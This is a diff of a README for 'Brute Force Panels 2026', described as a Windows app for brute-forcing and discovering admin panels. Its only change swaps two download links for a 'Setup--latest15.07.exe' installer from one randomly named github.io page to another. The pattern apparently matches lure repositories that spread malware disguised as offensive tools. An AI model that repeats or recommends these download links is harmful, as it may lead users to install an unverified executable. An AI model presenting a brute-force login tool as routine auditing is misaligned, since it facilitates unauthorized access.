@@ -2,7 +2,7 @@
 
 Brute Force Panels 2026 is a powerful Windows desktop application designed to streamline the management and testing of multiple brute force panels. This tool integrates features like admin panel discovery, multi-protocol support, and cloud-based operations for comprehensive security audits. It is built for Windows 10 and 11 systems, ensuring compatibility and performance. Whether you are a security professional or an IT administrator, this tool provides the necessary capabilities to assess and harden your systems against unauthorized access attempts.
 
-[![Download Installer](https://img.shields.io/badge/Download-Setup--latest15.07.exe-brightgreen?style=for-the-badge&logo=windows)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Setup--latest15.07.exe-brightgreen?style=for-the-badge&logo=windows)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -76,7 +76,7 @@ If you experience issues with the tool, try the following steps:
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides access to the current release. Always verify the file integrity after downloading.
 
